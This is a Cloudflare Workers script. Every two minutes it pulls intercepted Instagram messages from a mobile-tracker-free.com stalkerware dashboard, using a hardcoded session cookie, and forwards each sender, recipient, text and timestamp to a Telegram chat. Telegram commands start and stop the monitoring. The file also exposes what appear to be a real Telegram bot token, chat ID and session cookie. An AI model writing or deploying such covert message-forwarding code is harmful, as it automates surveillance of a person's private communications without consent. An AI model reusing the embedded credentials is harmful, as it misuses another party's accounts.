import { WorkflowEntrypoint, WorkflowStep, WorkflowEvent } from 'cloudflare:workers';

// Environment bindings
const BOT_TOKEN = '7843263003:AAGFsIrHyBeQ2MwcrxaiOfxqNjZUeCzHUfw';
const CHAT_ID = '7299431324';

// User-defined params passed to your workflow
type Params = {
	action: string;
	chatId?: string;
};

// Workflow entrypoint
export class ZMessagesWorkflow extends WorkflowEntrypoint {
	async run(event: WorkflowEvent<Params>, step: WorkflowStep) {
		const { action } = event.payload;
		
		if (action === 'start') {
			// Start monitoring workflow
			await step.do('send-start-message', async () => {
				await this.sendToTelegram('🚀 Z monitoring started! Checking for messages every 2 minutes...');
			});
			
			// Run infinite loop with 2-minute intervals
			let shouldContinue = true;
			let iteration = 0;
			
			while (shouldContinue) {
				iteration++;
				
				// Fetch and process messages
				await step.do(`fetch-messages-${iteration}`, async () => {
					await this.fetchZMessages();
				});
				
				// Wait for 2 minutes
				await step.sleep('wait-2-minutes', '2 minutes');
				
				// Check if we should continue (you can implement stop logic here)
				// For now, we'll run indefinitely
				// You can add a check for stop command via webhook or external trigger
			}
		}
		
		if (action === 'stop') {
			await step.do('send-stop-message', async () => {
				await this.sendToTelegram('⏹️ Z monitoring stopped!');
			});
		}
		
		if (action === 'fetch-once') {
			await step.do('fetch-single-time', async () => {
				await this.fetchZMessages();
			});
		}
	}
	
	// Function to send message to Telegram
	async sendToTelegram(message) {
		const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({
				chat_id: CHAT_ID,
				text: message,
				parse_mode: 'HTML'
			})
		});
		
		if (response.ok) {
			console.log('✅ Message sent to Telegram successfully');
		} else {
			console.log('❌ Failed to send to Telegram:', response.status);
		}
	}
	
	// Function to fetch Z messages
	async fetchZMessages() {
		console.log('🔍 Fetching Z messages...');
		
		const timestamp = Date.now();
		const url = `https://mobile-tracker-free.com/dashboard/scripts/data/server_processing_instagram_messages.php?_=${timestamp}`;
		
		const response = await fetch(url, {
			method: 'GET',
			headers: {
				'authority': 'mobile-tracker-free.com',
				'accept': 'application/json, text/javascript, */*; q=0.01',
				'accept-language': 'en-US,en;q=0.9',
				'cookie': 'cookieconsent_dismissed=yes; _ga=GA1.1.1313904396.1750180702; PHPSESSID=5nd4cg3q6p0b825tmqpkn6sfio; __gads=ID=fa4a9afb4cf40c39:T=1750180759:RT=1750180759:S=ALNI_Masl8D9EehE08rBbg73ALiZNrVwjg; __gpi=UID=00001131c2de4d56:T=1750180759:RT=1750180759:S=ALNI_MYmu48BKl3peGa2fEmEHq2r6iViPQ; __eoi=ID=4b1c8f36bfb63864:T=1750180759:RT=1750180759:S=AA-Afja8nSoBTQ1jVUN3IRXudneW; _ga_T5EHTJWJ5R=GS2.1.s1750180702$o1$g1$t1750180782$j46$l0$h0; FCNEC=%5B%5B%22AKsRol8DurHAse9J92iGKJl0EUDFVvGuxQs9HNKfeFvtyFeAphSDwRGSyGjpK6STBDcKd-gxkhdXsMoR-i1ZgbILjXwBhyjHYEGip6PeqzGYfLP1YrlOwuxo8exOgQHwJeOU_d_eGVertt1PLfXEeTh0u30ITvMaag%3D%3D%22%5D%5D',
				'referer': 'https://mobile-tracker-free.com/dashboard/instagrammessages.php',
				'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'sec-fetch-dest': 'empty',
				'sec-fetch-mode': 'cors',
				'sec-fetch-site': 'same-origin',
				'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
				'x-requested-with': 'XMLHttpRequest'
			}
		});
		
		if (response.ok) {
			const jsonData = await response.text();
			await this.parseZMessages(jsonData);
			console.log('✅ Request successful');
		} else {
			console.log(`❌ Request failed with status: ${response.status}`);
		}
	}
	
	// Function to parse Z messages
	async parseZMessages(jsonData) {
		try {
			const data = JSON.parse(jsonData);
			const messages = data.aaData;
			const allMessages = [];
			
			messages.forEach((message, index) => {
				const sender = message[2];
				const text = message[3];
				const timestamp = message[4];
				
				// Skip unknown messages and message sending status
				if (!sender || sender === 'Message sending…' || sender.includes('Unknown')) {
					return;
				}
				
				// Extract sender and receiver names
				let senderName = 'Unknown';
				let receiverName = 'Unknown';
				
				if (sender && sender.includes(':')) {
					const parts = sender.split(':');
					senderName = parts[0].replace(/___/g, '').trim();
					
					if (parts.length > 1) {
						receiverName = parts[1].trim();
					}
				} else if (sender && sender !== 'Message sending…') {
					senderName = sender.replace(/___/g, '').trim();
				}
				
				// Skip if still unknown
				if (senderName === 'Unknown' || senderName === '') {
					return;
				}
				
				// Format time
				let formattedTime = timestamp;
				if (timestamp && timestamp.includes(' ')) {
					const timePart = timestamp.split(' ')[1];
					if (timePart) {
						formattedTime = timePart.substring(0, 5);
					}
				}
				
				// Clean up message text (show full text)
				let cleanText = text || 'No text';
				
				const messageText = `📱 Message ${allMessages.length + 1}
From: ${senderName}
To: ${receiverName}
Text: ${cleanText}
Time: ${formattedTime}`;

				allMessages.push(messageText);
			});
			
			if (allMessages.length > 0) {
				const combinedMessage = `🔄 Z Messages Update\n\n${allMessages.join('\n\n')}\n\n✅ Total Messages: ${allMessages.length}`;
				await this.sendToTelegram(combinedMessage);
			} else {
				console.log('ℹ️ No new messages found or all messages filtered out');
			}
			
		} catch (error) {
			console.error('❌ Error parsing data:', error.message);
		}
	}
}

// Fetch handler for HTTP requests
export default {
	async fetch(req, env) {
		const url = new URL(req.url);
		
		// Handle favicon requests
		if (url.pathname.startsWith('/favicon')) {
			return Response.json({}, { status: 404 });
		}
		
		// Handle Telegram webhook
		if (url.pathname === '/webhook' && req.method === 'POST') {
			const update = await req.json();
			
			if (update.message && update.message.text) {
				const text = update.message.text;
				const chatId = update.message.chat.id.toString();
				
				// Only respond to our specific chat
				if (chatId === CHAT_ID) {
					if (text === '/start') {
						// Start monitoring workflow
						await env.Z_MESSAGES_WORKFLOW.create({
							params: { action: 'start', chatId }
						});
					} else if (text === '/stop') {
						// Stop monitoring workflow
						await env.Z_MESSAGES_WORKFLOW.create({
							params: { action: 'stop', chatId }
						});
					} else if (text === '/fetch') {
						// Fetch once
						await env.Z_MESSAGES_WORKFLOW.create({
							params: { action: 'fetch-once', chatId }
						});
					}
				}
			}
			
			return Response.json({ ok: true });
		}
		
		// Get workflow status
		let id = url.searchParams.get('instanceId');
		if (id) {
			let instance = await env.Z_MESSAGES_WORKFLOW.get(id);
			return Response.json({
				status: await instance.status(),
			});
		}
		
		// Manual trigger workflow
		const action = url.searchParams.get('action') || 'fetch-once';
		let instance = await env.Z_MESSAGES_WORKFLOW.create({
			params: { action }
		});
		
		return Response.json({
			id: instance.id,
			details: await instance.status(),
			message: `Z Messages workflow started with action: ${action}`
		});
	},
};
